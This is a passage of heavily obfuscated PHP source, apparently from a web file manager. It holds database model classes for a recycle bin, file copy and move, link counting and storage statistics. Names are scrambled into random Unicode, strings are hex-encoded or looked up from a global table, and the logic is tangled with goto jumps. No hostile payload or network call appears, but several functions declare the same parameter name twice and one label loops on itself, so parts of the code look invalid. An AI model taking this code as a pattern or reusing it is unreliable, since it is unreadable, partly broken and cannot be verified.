$e, $C𵙖[1731] => 1, $C𵙖[1453] => $fΔ, $C𵙖[1732] => $f[$C𵙖[414]], $C𵙖[1452] => $aⅵ, $C𵙖[1733] => $E, $C𵙖[1734] => $b½); return $Cǂ; } public function addFileCheckExist($dłա, $c, $b) { $aݽ =& $_SERVER[拘]; $c✻ = $this->{$_SERVER[拘][1737]}($dłա, $c); if (!$c✻) { return !1; } $D = array($aݽ[1731] => $c✻[$aݽ[1738]] + 1, $aݽ[1730] => $b); $this->{$_SERVER[拘][501]}(array($aݽ[1739] => $c✻[$aݽ[1740]]))->{$_SERVER[拘][1062]}($D); return $c✻; } public function remove($Cч) { $this->{$_SERVER[拘][1741]}($Cч, !1); $this->{$_SERVER[拘][1742]}(); } public function linkAdd($f) { $this->{$_SERVER[拘][1741]}($f, !0); } public function linkCountChange($d𪭻, $b۵) { goto dȩޏ; C߻υ: foreach ($bԅ as $b醎 => $A) { $b׶ = $A . $a֠[67]; if (!$Fˊ[$b׶]) { $Fˊ[$b׶] = array(); } $Fˊ[$b׶][] = $b醎; } foreach ($Fˊ as $A => $e) { $A = $b۵ ? $A : -$a֠[455]($A); $E纆 = array($a֠[1740] => array($a֠[359], $e), $a֠[1738] => array($a֠[200], 0)); $this->{$_SERVER[拘][501]}($E纆)->{$_SERVER[拘][1620]}($a֠[1738], $A); } goto cඕݥ; dȩޏ: $a֠ =& $_SERVER[拘]; if (!$d𪭻) { return; } if (!$a֠[93]($d𪭻)) { $d𪭻 = array($d𪭻); } goto F䡸ƺ; F䡸ƺ: $bԅ = array(); foreach ($d𪭻 as $b醎) { $b׶ = $b醎 . $a֠[67]; if (!$bԅ[$b׶]) { $bԅ[$b׶] = 0; } $bԅ[$b׶]++; } $Fˊ = array(); goto C߻υ; cඕݥ: } public function findByHash($B̟, $eĺ = false) { $dөז =& $_SERVER[拘]; $Dօ = array($dөז[1733] => $B̟); if ($eĺ) { $Dօ = array($dөז[1734] => $eĺ); } return $this->{$_SERVER[拘][1450]}($dөז[1743])->{$_SERVER[拘][501]}($Dօ)->{$_SERVER[拘][502]}(); } public function clearEmpty($E = 0) { $f =& $_SERVER[拘]; $dӈ = $f[50]() - 3600 * 24 * $E; $Dβ = $f[1744] . $dӈ; $A = $this->{$_SERVER[拘][501]}($Dβ)->{$_SERVER[拘][1042]}(); for ($eױ = 0; $eױ < $f[37]($A); $eױ++) { IO::remove($A[$eױ][$f[40]]); } $this->{$_SERVER[拘][501]}($Dβ)->{$_SERVER[拘][308]}(); } public function refreshData() { $Dӕ =& $_SERVER[拘]; $this->{$_SERVER[拘][1745]}(); $fؚ = $this->{$_SERVER[拘][1042]}(); foreach ($fؚ as $b) { goto fć; FǾ: $B = $Dӕ[64]($Dӕ[1747])->{$_SERVER[拘][501]}($fۆÐ)->{$_SERVER[拘][1152]}(); $Aժ = $bɻ + $B; if ($b[$Dӕ[1738]] == $Aժ) { continue; } goto e˩˷; e˩˷: $this->{$_SERVER[拘][501]}($fۆÐ)->{$_SERVER[拘][1062]}(array($Dӕ[1731] => $Aժ)); goto bގ; fć: $fۆÐ = array($Dӕ[1739] => $b[$Dӕ[1740]]); if ($this->{$_SERVER[拘][1746]}($b)) { continue; } $bɻ = $Dӕ[64]($Dӕ[480])->{$_SERVER[拘][501]}($fۆÐ)->{$_SERVER[拘][1152]}(); goto FǾ; bގ: } $this->{$_SERVER[拘][1742]}(0); } private function removeNotExist($A󓹪) { goto c; c: $aʫ =& $_SERVER[拘]; if (IO::exist($A󓹪[$aʫ[40]])) { return !1; } $this->{$_SERVER[拘][62]}($A󓹪[$aʫ[1740]]); goto aʪَ; a͚: return !0; goto Aˈ; aʪَ: $AΙ = array($aʫ[1739] => $A󓹪[$aʫ[1740]]); $aʫ[64]($aʫ[480])->{$_SERVER[拘][501]}($AΙ)->{$_SERVER[拘][308]}(); $aʫ[64]($aʫ[1747])->{$_SERVER[拘][501]}($AΙ)->{$_SERVER[拘][308]}(); goto a͚; Aˈ: } private function refreshSourceHistory() { $aŉӃۄ =& $_SERVER[拘]; $DЌ = $aŉӃۄ[64]($aŉӃۄ[1748])->{$_SERVER[拘][1042]}(); if (!$DЌ) { return; } foreach ($DЌ as $E¢ލ) { $f޿ = array($aŉӃۄ[1470] => $E¢ލ[$aŉӃۄ[499]]); if (!$aŉӃۄ[64]($aŉӃۄ[480])->{$_SERVER[拘][501]}($f޿)->{$_SERVER[拘][502]}()) { $aŉӃۄ[64]($aŉӃۄ[1748])->{$_SERVER[拘][501]}($f޿)->{$_SERVER[拘][308]}(); } } } public function storageInfo($a = false) { goto eܡ; eܡ: $aﳵÊ =& $_SERVER[拘]; $Bʆ = $this->{$_SERVER[拘][1152]}() + 0.0; $bϑ = 0; goto c彐; c彐: $Dז = 1; $A콪 = 0; $Cǂ = 5000; goto fܞ; fܞ: for ($Bؼǌ = 0; $Bؼǌ < $Bʆ; $Bؼǌ = $Bؼǌ + $Cǂ) { $cƪ = $this->{$_SERVER[拘][1520]}($Bؼǌ, $Bؼǌ + $Cǂ)->{$_SERVER[拘][1042]}(); foreach ($cƪ as $A蚋) { $Dז += $A蚋[$aﳵÊ[490]] * $A蚋[$aﳵÊ[1738]]; $bϑ += $A蚋[$aﳵÊ[490]] * ($A蚋[$aﳵÊ[1738]] - 1); $A콪 += $A蚋[$aﳵÊ[1738]]; } } $DЬ = array($aﳵÊ[1749] => $Dז, $aﳵÊ[1750] => $bϑ, $aﳵÊ[1751] => $bϑ / $Dז, $aﳵÊ[630] => $Bʆ, $aﳵÊ[1752] => $A콪); return $DЬ; goto B; B: } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\x63\145\x5f\162\145\x63\x79\143\154\145"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\145\x72\x74", "\146\165\156\143\164\151\x6f\156")); public function listData($E֡߭ = false) { $CηǬ =& $_SERVER[拘]; $E֡߭ = $E֡߭ ? $E֡߭ : USER_ID; $aأ = $this->{$_SERVER[拘][501]}(array($CηǬ[1445] => $E֡߭))->{$_SERVER[拘][1042]}(); return $CηǬ[413]($aأ, $CηǬ[67], $CηǬ[499]); } public function moveToRecycle($Eǵꏪ) { goto Fɨ; F̼: $this->{$_SERVER[拘][1755]}($Eǵꏪ, 1); if ($E˷[$Dϥ[503]] == $Dϥ[162]) { $cᑉ  = array($Dϥ[1754] => array($Dϥ[1756], $E˷[$Dϥ[747]] . $Eǵꏪ . $Dϥ[1757])); $cѧ->{$_SERVER[拘][501]}($cᑉ )->{$_SERVER[拘][1063]}($Dϥ[1753], 1); } goto eĠ; fӈ: if (!$E˷ || $E˷[$Dϥ[1753]] == $Dϥ[162]) { return; } $Aܿ = array($Dϥ[1470] => $Eǵꏪ, $Dϥ[1445] => USER_ID, $Dϥ[1624] => $E˷[$Dϥ[1686]], $Dϥ[1625] => $E˷[$Dϥ[1661]], $Dϥ[1754] => $E˷[$Dϥ[747]]); $this->{$_SERVER[拘][63]}($Aܿ); goto F̼; Fɨ: $Dϥ =& $_SERVER[拘]; $cѧ = $Dϥ[64]($Dϥ[480]); $E˷ = $cѧ->{$_SERVER[拘][491]}($Eǵꏪ); goto fӈ; eĠ: } public function clear() { $this->{$_SERVER[拘][62]}(!1); } public function remove($E󕽷 = false) { goto f; Cƚ: foreach ($E as $Eɚ) { $c֖->{$_SERVER[拘][1758]}($Eɚ[$f蠴[1686]], $Eɚ[$f蠴[1661]]); } goto āɫ; f: $f蠴 =& $_SERVER[拘]; $c֖ = $f蠴[64]($f蠴[480]); $a = $this->{$_SERVER[拘][504]}(); goto eū; eū: $E󕽷 = $E󕽷 === !1 ? !1 : $E󕽷; $E = array(); foreach ($a as $a꺼) { if ($E󕽷 == !1 || $f蠴[176]($a꺼, $E󕽷)) { $BЍ = $this->{$_SERVER[拘][501]}(array($f蠴[499] => $a꺼))->{$_SERVER[拘][502]}(); $DګЉ = $BЍ[$f蠴[1686]] . $f蠴[183] . $BЍ[$f蠴[1661]]; $E[$DګЉ] = array($f蠴[1624] => $BЍ[$f蠴[1686]], $f蠴[1661] => $BЍ[$f蠴[1661]]); $this->{$_SERVER[拘][501]}(array($f蠴[499] => $a꺼))->{$_SERVER[拘][308]}(); $c֖->{$_SERVER[拘][62]}($a꺼, !1); } } goto Cƚ; āɫ: } public function restore($D׹׷ʑ = false) { goto ḛ; e܈: $c->{$_SERVER[拘][1762]}($E); goto cت؊; ḛ: $d =& $_SERVER[拘]; $c = $d[64]($d[480]); $fل = $this->{$_SERVER[拘][504]}(); goto eǊۍ; eǊۍ: $D׹׷ʑ = $D׹׷ʑ == !1 ? !1 : $D׹׷ʑ; $E = array(); foreach ($fل as $c훖) { if ($D׹׷ʑ == !1 || $d[176]($c훖, $D׹׷ʑ)) { goto e; fҐ: $this->{$_SERVER[拘][501]}(array($d[499] => $c훖))->{$_SERVER[拘][308]}(); $c->{$_SERVER[拘][1761]}($f쉘ݟ[$d[483]]); $E[] = $f쉘ݟ[$d[483]]; goto D; e: $f쉘ݟ = $c->{$_SERVER[拘][501]}(array($d[499] => $c훖))->{$_SERVER[拘][502]}(); $B = $c->{$_SERVER[拘][501]}(array($d[499] => $f쉘ݟ[$d[483]]))->{$_SERVER[拘][502]}(); if ($B[$d[1753]] == $d[162]) { continue; } goto dۛۇ; dۛۇ: $this->{$_SERVER[拘][1755]}($c훖, 0); if ($f쉘ݟ[$d[503]] == $d[162]) { $E = array($d[1754] => array($d[1756], $f쉘ݟ[$d[747]] . $c훖 . $d[1757])); $c->{$_SERVER[拘][501]}($E)->{$_SERVER[拘][1063]}($d[1753], 0); } $d[64]($d[1671])->{$_SERVER[拘][1759]}($c훖, $d[1760]); goto fҐ; D: if ($f쉘ݟ[$d[503]] == $d[162]) { $E[] = $c훖; } goto D; D: } } goto e܈; cت؊: } private function recycleMove($d̥, $E۔ = 1) { $Dƽ =& $_SERVER[拘]; $Bّ = $Dƽ[64]($Dƽ[480]); $cߋ = $Dƽ[64]($Dƽ[1763]); $eĥֲ = array($Dƽ[499] => $d̥); if ($E۔) { $Bّ->{$_SERVER[拘][501]}($eĥֲ)->{$_SERVER[拘][1063]}($Dƽ[1753], 1); $cߋ->{$_SERVER[拘][1759]}($d̥, $Dƽ[1764]); } else { $bօ = $Bّ->{$_SERVER[拘][501]}($eĥֲ)->{$_SERVER[拘][502]}(); $c܏ϗ = $bօ[$Dƽ[503]] == $Dƽ[162]; $aЈ = $Bّ->{$_SERVER[拘][394]}($bօ[$Dƽ[483]], $bօ[$Dƽ[375]], REPEAT_RENAME_FOLDER, $c܏ϗ); if ($aЈ != $bօ[$Dƽ[375]]) { $Bّ->{$_SERVER[拘][489]}($d̥, $aЈ); } $Bّ->{$_SERVER[拘][501]}($eĥֲ)->{$_SERVER[拘][1063]}($Dƽ[1753], 0); $cߋ->{$_SERVER[拘][1759]}($d̥, $Dƽ[1760]); } } } class SourceListMoveModel extends SourceListModel { public function isParentOf($c, $dő) { goto D܉; C󴎭: $B = $C[$cӅ[747]] . $C[$cӅ[499]] . $cӅ[119]; $bۅ = $F¤޽[$cӅ[747]] . $F¤޽[$cӅ[499]] . $cӅ[119]; $Cʯ = $cӅ[165]($bۅ, $B) === 0; goto d; D܉: $cӅ =& $_SERVER[拘]; $C = $this->{$_SERVER[拘][491]}($c); $F¤޽ = $this->{$_SERVER[拘][491]}($dő); goto C󴎭; d: return $Cʯ; goto E̩; E̩: } public function copy($E減, $C, $c = REPEAT_REPLACE, $dӟ = '') { goto D; FƄɇ׊: if ($bݍ[$Eخٽ[503]] == $Eخٽ[162] && $B䋚 == $c) { $this->{$_SERVER[拘][1771]}($B䋚); } $Eخٽ[64]($Eخٽ[1772])->{$_SERVER[拘][1161]}($Eڟ[$Eخٽ[1766]], array(), !0); $Eخٽ[64]($Eخٽ[1671])->{$_SERVER[拘][1773]}($c); goto D֍; EՎ: $this->{$_SERVER[拘][1762]}($C); return $c; goto Dܭ; a٩ך: if (!$bݍ || !$e͝ || $e͝[$Eخٽ[503]] != $Eخٽ[162]) { return !1; } if ($this->{$_SERVER[拘][386]}($E減, $C)) { return !1; } $Eڟ = array($Eخٽ[1765] => array(), $Eخٽ[1766] => array(), $Eخٽ[1767] => array()); goto dɆ¦; D: $Eخٽ =& $_SERVER[拘]; $bݍ = $this->{$_SERVER[拘][491]}($E減); $e͝ = $this->{$_SERVER[拘][491]}($C); goto a٩ך; D֍: $this->{$_SERVER[拘][1774]}($Eڟ[$Eخٽ[1767]]); $Eخٽ[64]($Eخٽ[18])->{$_SERVER[拘][1775]}($Eڟ[$Eخٽ[1765]]); $this->{$_SERVER[拘][1761]}($C); goto EՎ; dɆ¦: $B䋚 = $this->{$_SERVER[拘][1768]}($C, $bݍ[$Eخٽ[375]]); $c = $this->{$_SERVER[拘][1769]}($E減, $C, $c, $Eڟ, !0, $dӟ); $this->{$_SERVER[拘][1770]}(); goto FƄɇ׊; Dܭ: } private function _copy($B, $C㸊, $eĴ, &$F, $b̼, $B = '') { goto Fª; B툃: $Fު͎ = $B ? $B : $aĩ[$C[375]]; $aܱۚ = $this->{$_SERVER[拘][1768]}($C㸊, $Fު͎); if ($b̼) { $this->{$_SERVER[拘][1777]}($B); if ($b烈 && $aܱۚ) { $this->{$_SERVER[拘][1777]}($aܱۚ); } } goto D؜Σ; Fª: $C =& $_SERVER[拘]; $aĩ = $this->{$_SERVER[拘][1776]}($B); $b烈 = $aĩ[$C[503]] == $C[162]; goto B툃; aԻ: return $d; goto Aݏ; D؜Σ: if (!$aܱۚ) { return $this->{$_SERVER[拘][1778]}($B, $C㸊, $Fު͎, $F); } $d = $aܱۚ; if ($b烈) { if ($eĴ == REPEAT_RENAME_FOLDER) { $Fު͎ = $this->{$_SERVER[拘][1779]}($C㸊, $Fު͎, $eĴ, $b烈); $d = $this->{$_SERVER[拘][1778]}($B, $C㸊, $Fު͎, $F); } else { $DĹ = $this->{$_SERVER[拘][1780]}($B); foreach ($DĹ as $Dչ) { $this->{$_SERVER[拘][1769]}($Dչ[$C[499]], $aܱۚ, $eĴ, $F, !1); } } } else { if ($eĴ == REPEAT_RENAME || $eĴ == REPEAT_RENAME_FOLDER) { $Fު͎ = $this->{$_SERVER[拘][1779]}($C㸊, $Fު͎, $eĴ, $b烈); $d = $this->{$_SERVER[拘][1778]}($B, $C㸊, $Fު͎, $F); } else { if ($eĴ == REPEAT_REPLACE) { $eϝ = $this->{$_SERVER[拘][1776]}($aܱۚ); $Dʃҩ = $this->{$_SERVER[拘][1781]}($eϝ, $aĩ[$C[1740]], $aĩ[$C[490]]); if ($Dʃҩ) { $F[$C[1765]][] = $aĩ[$C[1740]]; } $C[1782]($eĴ, array($B, $C㸊, $aܱۚ), $eϝ, $Dʃҩ, $F, $aĩ); } else { if ($eĴ == REPEAT_SKIP) { } } } } goto aԻ; Aݏ: } private function _copyCreate($bѬ, $f, $dȲݾ, &$c񚲆) { goto c˱; c˱: $Eȱ =& $_SERVER[拘]; $C׿ = $this->{$_SERVER[拘][1776]}($bѬ); $c¶ = $this->{$_SERVER[拘][1776]}($f); goto d; d: $eܝℍ = $this->{$_SERVER[拘][1783]}($C׿, $c¶, $dȲݾ); Hook::trigger($Eȱ[1784], $eܝℍ); $cՆ = $this->{$_SERVER[拘][63]}($eܝℍ); goto eÚ; F: $f[$bѬ] = $cՆ; $bӦ坦 = array(); $CÑ = array(); goto c; c: foreach ($AƟ as $dҠ⺐) { $aЦȃ = $dҠ⺐[$Eȱ[499]]; $cۮ = $this->{$_SERVER[拘][1788]}($f, $dҠ⺐, $aԋ); $bӦ坦[] = array($Eȱ[499], $aЦȃ, $Eȱ[483], $cۮ[$Eȱ[483]]); $CÑ[] = array($Eȱ[499], $aЦȃ, $Eȱ[747], $cۮ[$Eȱ[747]]); $this->{$_SERVER[拘][1785]}($dҠ⺐, $c񚲆); if ($dҠ⺐[$Eȱ[503]] != $Eȱ[162]) { $c񚲆[$Eȱ[1765]][] = $dҠ⺐[$Eȱ[1740]]; } } $this->{$_SERVER[拘][1774]}($bӦ坦); $this->{$_SERVER[拘][1774]}($CÑ); goto aџ; aŹ: if ($Eȱ[37]($Eʎ) == 0) { return $cՆ; } $aԋ = $this->{$_SERVER[拘][491]}($cՆ); foreach ($Eʎ as $dҠ⺐) { $A숶ש = $this->{$_SERVER[拘][1783]}($dҠ⺐, $aԋ, $dҠ⺐[$Eȱ[375]]); $A숶ש[$Eȱ[747]] = $dҠ⺐[$Eȱ[747]]; $f[] = $A숶ש; } goto D깝; aџ: return $cՆ; goto cۅ; CϽÿ: $Eʎ = array(); $f = array(); $this->{$_SERVER[拘][1786]}($bѬ, $Eʎ); goto aŹ; D깝: $this->{$_SERVER[拘][1161]}($f); $AƟ = $this->{$_SERVER[拘][501]}(array($Eȱ[483] => $cՆ))->{$_SERVER[拘][1042]}(); $f = $this->{$_SERVER[拘][1787]}($Eʎ, $AƟ); goto F; eÚ: $Fꂪ = array($Eȱ[499] => $cՆ, $Eȱ[375] => $dȲݾ); $this->{$_SERVER[拘][1785]}($Fꂪ, $c񚲆); if ($C׿[$Eȱ[503]] != $Eȱ[162]) { $c񚲆[$Eȱ[1765]][] = $C׿[$Eȱ[1740]]; return $cՆ; } goto CϽÿ; cۅ: } private function _childrenMakeRelation($aپ, $C) { $e =& $_SERVER[拘]; $AƛЧ = array(); $DΦǹ = array(); foreach ($aپ as $e˰) { $BÜǯ = $e˰[$e[375]] . $e[44] . $e˰[$e[747]]; $AƛЧ[$BÜǯ] = $e˰[$e[499]]; } foreach ($C as $e˰) { $BÜǯ = $e˰[$e[375]] . $e[44] . $e˰[$e[747]]; $aꖱ = $AƛЧ[$BÜǯ]; $DΦǹ[$aꖱ] = $e˰[$e[499]]; } return $DΦǹ; } private function _childrenMatch($B͓, $f䜓, $c) { goto a; eّ: $f͒ = $B͓[$C[$d[37]($C) - 1]]; foreach ($C as $E) { if (isset($B͓[$E])) { $fȜ .= $B͓[$E] . $d[1790]; } } $fȜ = $d[43]($fȜ, $d[119]) . $d[119]; goto d䈇; d䈇: return array($d[483] => $f͒, $d[747] => $fȜ); goto F፶; a: $d =& $_SERVER[拘]; $fȜ = $c[$d[747]]; $C = $this->{$_SERVER[拘][1789]}($f䜓[$d[747]]); goto eّ; F፶: } private function _makeItemData($Cކ, $e, $bٷ) { $Cđӛ =& $_SERVER[拘]; $E䝄 = array($Cđӛ[1791] => $Cކ[$Cđӛ[503]], $Cđӛ[1453] => $bٷ, $Cđӛ[1792] => $Cކ[$Cđӛ[1793]], $Cđӛ[1739] => $Cކ[$Cđӛ[1740]], $Cđӛ[1730] => $Cކ[$Cđӛ[490]], $Cđӛ[1624] => $e[$Cđӛ[1686]], $Cđӛ[1625] => $e[$Cđӛ[1661]], $Cđӛ[1794] => USER_ID, $Cđӛ[1795] => USER_ID, $Cđӛ[500] => $e[$Cđӛ[499]], $Cđӛ[1754] => $e[$Cđӛ[747]] . $e[$Cđӛ[499]] . $Cđӛ[119], $Cđӛ[1796] => 0); return $E䝄; } private function _copyApplyMeta($b̄, &$eϡĎ) { $A =& $_SERVER[拘]; $e = $b̄[$A[499]]; $c۪ = $b̄[$A[375]]; if (!isset($b̄[$A[1797]]) || !$b̄[$A[1797]] || $b̄[$A[1797]] == $A[163]) { $eϡĎ[$A[1767]][] = array($A[499], $e, $A[1797], $A[1683]($e)); } if (Input::check($c۪, $A[1798])) { $eϡĎ[$A[1766]][] = array($A[499] => $e, $A[257] => $A[1799], $A[937] => $A[69]($A[168], $A[67], Pinyin::encode($c۪))); $eϡĎ[$A[1766]][] = array($A[499] => $e, $A[257] => $A[1800], $A[937] => Pinyin::encode($c۪, $A[1801])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Dܒ) { goto Bᷞ; bϐ: $cÏֿ = $B֘[413]($cÏֿ, $B֘[499]); foreach ($cÏֿ as $bı) { $Dܖ = $bı[$B֘[483]]; $Dܒ = $bı[$B֘[499]]; if (!isset($this->_childrenListCache[$Dܒ]) && $bı[$B֘[503]] == $B֘[162]) { $this->_childrenListCache[$Dܒ] = array(); } if (!isset($this->_childrenListCache[$Dܖ])) { $this->_childrenListCache[$Dܖ] = array(); } $this->_childrenListCache[$Dܖ][$Dܒ] = $bı; $this->_childrenItemCache[$Dܒ] = $bı; } goto F׾ĵ; Bᷞ: $B֘ =& $_SERVER[拘]; $Eʿ = $this->{$_SERVER[拘][491]}($Dܒ); $D = $B֘[1802]; goto e̅; e̅: $D󭦙 = array($B֘[747] => array($B֘[1756], $Eʿ[$B֘[747]] . $Dܒ . $B֘[1757]), $B֘[1753] => 0); $cÏֿ = $this->{$_SERVER[拘][1164]}($D)->{$_SERVER[拘][501]}($D󭦙)->{$_SERVER[拘][1042]}(); if (!$cÏֿ) { return; } goto bϐ; F׾ĵ: } private function _childrenListAll($fԚ, &$B) { $dƇ =& $_SERVER[拘]; if (!isset($this->_childrenListCache[$fԚ])) { return; } $BՄ = $this->_childrenListCache[$fԚ]; foreach ($BՄ as $c => $fॐ) { $B[$c] = $fॐ; if ($fॐ[$dƇ[503]] == $dƇ[162]) { $this->{$_SERVER[拘][1786]}($c, $B); } } } private function sourceInfoCache($cō) { if (isset($this->_childrenItemCache[$cō])) { return $this->_childrenItemCache[$cō]; } return $this->{$_SERVER[拘][491]}($cō); } private function _childrenList($a) { if (isset($this->_childrenListCache[$a])) { return $this->_childrenListCache[$a]; } return $this->{$_SERVER[拘][1803]}($a); } private function _childrenListSelect($Dϋ) { goto C; C̿: foreach ($fʌ as $Dϋ => $f) { $this->_childrenItemCache[$Dϋ] = $f; } return $fʌ; goto fߤ; C: $F̒ǔ =& $_SERVER[拘]; $dĮŽ = array($F̒ǔ[483] => $Dϋ, $F̒ǔ[1753] => 0); $DܻҊ = $this->{$_SERVER[拘][501]}($dĮŽ)->{$_SERVER[拘][1042]}(); goto C߮; C߮: $DܻҊ = $DܻҊ ? $DܻҊ : array(); $fʌ = $F̒ǔ[413]($DܻҊ, $F̒ǔ[499]); $this->_childrenListCache[$Dϋ] = $fʌ; goto C̿; fߤ: } private function fileNameExistCache($Bͦ, $c) { $BĐ =& $_SERVER[拘]; $c = $BĐ[80]($c); $FЛ = $this->{$_SERVER[拘][1780]}($Bͦ); foreach ($FЛ as $e˕) { if ($c == $BĐ[80]($e˕[$BĐ[375]])) { return $e˕[$BĐ[499]]; } } return !1; } private function fileNameAutoCache($cݬ, $e, $b, $B҅) { $cْ =& $_SERVER[拘]; $eŏ = $this->{$_SERVER[拘][1780]}($cݬ); $Aσ = $cْ[413]($eŏ, $cْ[67], $cْ[375]); return $this->{$_SERVER[拘][1804]}($Aσ, $e, $b, $B҅); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($c, $aܫ, $c = REPEAT_REPLACE, $eӱ = '') { goto Cȝ; Fҭ毌: $this->{$_SERVER[拘][1806]}($c, $aܫ); $F٠Ӭ = $this->{$_SERVER[拘][1768]}($aܫ, $e[$Cۮ[375]]); $e弳 = $this->{$_SERVER[拘][1807]}($c, $aܫ, $c, $E莜, $eӱ); goto f; f胠գ: if (!$e || !$b || $b[$Cۮ[503]] != $Cۮ[162] || $e[$Cۮ[483]] == $aܫ) { return !1; } if ($this->{$_SERVER[拘][386]}($c, $aܫ)) { return !1; } $E莜 = array($Cۮ[1765] => array(), $Cۮ[1805] => !1); goto Fҭ毌; Cȝ: $Cۮ =& $_SERVER[拘]; $e = $this->{$_SERVER[拘][491]}($c); $b = $this->{$_SERVER[拘][491]}($aܫ); goto f胠գ; f: $this->{$_SERVER[拘][1808]}(); if ($e[$Cۮ[503]] == $Cۮ[162] && $F٠Ӭ) { $this->{$_SERVER[拘][1771]}($e弳); } $Cۮ[64]($Cۮ[18])->{$_SERVER[拘][1775]}($E莜[$Cۮ[1765]]); goto Cލ; Cލ: if ($F٠Ӭ && $E莜[$Cۮ[1805]]) { $this->{$_SERVER[拘][62]}($c, !1); } $this->{$_SERVER[拘][1761]}($e[$Cۮ[483]]); $this->{$_SERVER[拘][1761]}($aܫ); goto fʙ; fʙ: $f = array($e[$Cۮ[483]], $aܫ); if ($e[$Cۮ[503]] == $Cۮ[162]) { $f[] = $c; } $this->{$_SERVER[拘][1762]}($f); goto aߙ; aߙ: $Cۮ[64]($Cۮ[1671])->{$_SERVER[拘][1809]}($c, $e[$Cۮ[483]], $aܫ); return $e弳; goto C; C: } private function _move($Aֵ, $Cϡ, $d, &$Dнǔ, $AҲ = '') { goto a; a: $aý =& $_SERVER[拘]; $dИ = $this->{$_SERVER[拘][491]}($Aֵ); $cں = $dИ[$aý[503]] == $aý[162]; goto d͍; d͍: $Fڦі = $AҲ ? $AҲ : $dИ[$aý[375]]; $E = $this->{$_SERVER[拘][1768]}($Cϡ, $Fڦі); if (!$E) { return $this->{$_SERVER[拘][1810]}($Aֵ, $Cϡ, $Fڦі); } goto F׏꽴; C: if ($Cե && !$Dнǔ[$aý[1805]]) { $Dнǔ[$aý[1805]] = !0; } return $F; goto e; F׏꽴: $F = $E; $Cե = !1; if ($cں) { if ($d == REPEAT_RENAME_FOLDER) { $Fڦі = $this->{$_SERVER[拘][394]}($Cϡ, $Fڦі, $d, $cں); $F = $this->{$_SERVER[拘][1810]}($Aֵ, $Cϡ, $Fڦі); } else { if ($d == REPEAT_RENAME_FOLDER) { $d = REPEAT_RENAME; } $E = $this->{$_SERVER[拘][1803]}($Aֵ); foreach ($E as $D) { $this->{$_SERVER[拘][1807]}($D[$aý[499]], $E, $d, $Dнǔ); } $Cե = !0; } } else { if ($d == REPEAT_SKIP) { $Cե = !0; } else { if ($d == REPEAT_RENAME || $d == REPEAT_RENAME_FOLDER) { $Fڦі = $this->{$_SERVER[拘][394]}($Cϡ, $Fڦі, $d, $cں); $F = $this->{$_SERVER[拘][1810]}($Aֵ, $Cϡ, $Fڦі); } else { if ($d == REPEAT_REPLACE) { $Dĕͼ = $this->{$_SERVER[拘][1776]}($E); $D屾Ă = $this->{$_SERVER[拘][1781]}($Dĕͼ, $dИ[$aý[1740]], $dИ[$aý[490]]); if ($D屾Ă) { $Dнǔ[$aý[1765]][] = $dИ[$aý[1740]]; } else { $Cե = !0; } } } } } goto C; e: } private function _moveForce($cڒ, $aݰ, $a) { goto CÈ; f: $e᳡ = $E[$Fߥ[503]] == $Fߥ[162]; $B = array($Fߥ[500] => $A࢟[$Fߥ[499]], $Fߥ[1754] => $A࢟[$Fߥ[747]] . $A࢟[$Fߥ[499]] . $Fߥ[119], $Fߥ[1624] => $A࢟[$Fߥ[1686]], $Fߥ[1625] => $A࢟[$Fߥ[1661]], $Fߥ[1795] => USER_ID, $Fߥ[1796] => 0, $Fߥ[1453] => $a); $B = $E[$Fߥ[1686]] == SourceModel::TYPE_GROUP && $A࢟[$Fߥ[1686]] == SourceModel::TYPE_GROUP && $E[$Fߥ[1661]] == $A࢟[$Fߥ[1661]]; goto a򱵱Ƨ; a򱵱Ƨ: if (!$B) { $Fߥ[64]($Fߥ[1653])->{$_SERVER[拘][1811]}($cڒ); } if ($e᳡) { $dǫ垡 = array($Fߥ[1754] => array($Fߥ[1756], $E[$Fߥ[747]] . $E[$Fߥ[499]] . $Fߥ[1757])); $BΔЅ = $E[$Fߥ[747]] . $E[$Fߥ[499]] . $Fߥ[119]; $Dŭ = $A࢟[$Fߥ[747]] . $A࢟[$Fߥ[499]] . $Fߥ[119] . $E[$Fߥ[499]] . $Fߥ[119]; $B̉ش = array($Fߥ[1754] => array($Fߥ[1812], "\x72\x65\160\x6c\x61\x63\145\x28\160\x61\x72\145\x6e\164\x4c\x65\x76\x65\154\54\x27{$BΔЅ}\x27\x2c\47{$Dŭ}\47\x29"), $Fߥ[1624] => $A࢟[$Fߥ[1686]], $Fߥ[1625] => $A࢟[$Fߥ[1661]], $Fߥ[1796] => 0); $this->{$_SERVER[拘][501]}($dǫ垡)->{$_SERVER[拘][1140]}($B̉ش)->{$_SERVER[拘][1062]}(); } $this->{$_SERVER[拘][501]}(array($Fߥ[1470] => $cڒ))->{$_SERVER[拘][1140]}($B)->{$_SERVER[拘][1062]}(); goto fۉ; CÈ: $Fߥ =& $_SERVER[拘]; $E = $this->{$_SERVER[拘][491]}($cڒ); $A࢟ = $this->{$_SERVER[拘][491]}($aݰ); goto f; fۉ: return $cڒ; goto CϔȾ; CϔȾ: } private function clearShare($Cڔ, $eӭ) { goto E; cεۑ: if (!$B) { return; } $B = $cع[413]($B, $cع[67], $cع[1646]); $Aś = array($cع[1646] => array($cع[359], $B)); goto B팅; Dڹ: if (!$B) { return; } $Aś = array($cع[499] => array($cع[359], $B), $cع[1656] => 1); $B = $cع[64]($cع[1813])->{$_SERVER[拘][1164]}($cع[1646])->{$_SERVER[拘][501]}($Aś)->{$_SERVER[拘][1042]}(); goto cεۑ; B팅: $cع[64]($cع[1813])->{$_SERVER[拘][501]}($Aś)->{$_SERVER[拘][1062]}(array($cع[1656] => 0)); $cع[64]($cع[1650])->{$_SERVER[拘][501]}($Aś)->{$_SERVER[拘][308]}(); goto B߆; E: $cع =& $_SERVER[拘]; $Aˈ = $this->{$_SERVER[拘][491]}($Cڔ); $a = $this->{$_SERVER[拘][491]}($eӭ); goto eΙ; eΙ: if ($Aˈ[$cع[1661]] == $a[$cع[1661]] && $Aˈ[$cع[1686]] == $cع[127]) { return; } $Aś = array($cع[747] => array($cع[1756], $Aˈ[$cع[747]] . $Cڔ . $cع[1757]), $cع[1753] => 0); $B = $this->{$_SERVER[拘][1164]}($cع[1470])->{$_SERVER[拘][501]}($Aś)->{$_SERVER[拘][1009]}($cع[499], 